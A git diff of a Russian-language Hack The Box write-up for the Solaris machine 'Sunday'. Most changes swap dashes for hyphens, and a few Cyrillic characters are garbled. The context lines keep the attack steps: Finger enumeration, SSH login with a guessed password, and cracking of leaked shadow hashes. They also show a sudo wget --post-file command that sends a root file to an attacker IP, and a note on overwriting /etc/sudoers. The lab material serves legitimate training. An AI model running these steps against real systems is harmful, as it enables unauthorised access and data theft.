@@ -1,4 +1,4 @@
-# Sunday (HTB)
+﻿# Sunday (HTB)
 
 > Платформа: Hack The Box  
 > ОС: Solaris  
@@ -21,7 +21,7 @@ Enumeration (Finger)
 
 Foothold (SSH)
 ├── ssh -p 22022 sunny@sunday.htb → password: sunday
-└── sudo -l → (root) NOPASSWD: /root/troll — ЛОВУШКА
+└── sudo -l → (root) NOPASSWD: /root/troll - ЛОВУШКА
 
 Lateral Movement (Backup)
 ├── cd /backup → agent22.backup, shadow.backup
@@ -64,7 +64,7 @@ sudo nmap -sC -sV -p- sunday.htb
 | 79    | Finger | Finger service |
 | 22022 | SSH    | OpenSSH 8.4    |
 
-Платформа — Solaris.
+Платформа - Solaris.
 
 ---
 
@@ -87,7 +87,7 @@ run
 root@10.129.77.192: root     Super-User     pts/3     <Apr 24 10:37>     sunday
 ```
 
-Поле Office Location содержит `sunday` — подсказка администратора.
+Поле Office Location содержит `sunday` - подсказка администратора.
 
 ---
 
@@ -125,7 +125,7 @@ sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
 sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
 ```
 
-Формат `$5$` — SHA-256 crypt, hashcat mode **7400**.
+Формат `$5$` - SHA-256 crypt, hashcat mode **7400**.
 
 ```bash
 echo '$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB' > hashes.txt
@@ -160,7 +160,7 @@ sudo wget --post-file=/root/root.txt http://10.10.14.160:8000/
 # <ROOT_FLAG>
 ```
 
-### Полноценный root — подмена /etc/sudoers
+### Полноценный root - подмена /etc/sudoers
 
 ```bash
 # Kali
@@ -180,7 +180,7 @@ cat /root/root.txt
 
 ## Flags
 
-| Флаг | �-начение                         |
+| Флаг | �-начение                         |
 |------|----------------------------------|
 | User | <USER_FLAG> |
 | Root | <ROOT_FLAG> |
@@ -189,9 +189,9 @@ cat /root/root.txt
 
 ## Key Takeaways
 
-- **Finger (79) — недооценённый сервис.** Не только список пользователей, но и подсказки в полях типа Office Location.
-- **Нестандартные порты** — обязательно `-p-`, SSH на 22022 легко пропустить.
-- **Ловушки (`troll`)** — не каждый `sudo -l` результат ведёт к реальному root.
-- **�-абытые backup-файлы** — `/backup/shadow.backup` даёт хеши.
-- **GTFOBins для wget** — `--post-file` для эксфильтрации, `-O` для подмены системных файлов.
-- **Форматирование hash-файлов** — только хеш, без метаданных.
+- **Finger (79) - недооценённый сервис.** Не только список пользователей, но и подсказки в полях типа Office Location.
+- **Нестандартные порты** - обязательно `-p-`, SSH на 22022 легко пропустить.
+- **Ловушки (`troll`)** - не каждый `sudo -l` результат ведёт к реальному root.
+- **�-абытые backup-файлы** - `/backup/shadow.backup` даёт хеши.
+- **GTFOBins для wget** - `--post-file` для эксфильтрации, `-O` для подмены системных файлов.
+- **Форматирование hash-файлов** - только хеш, без метаданных.
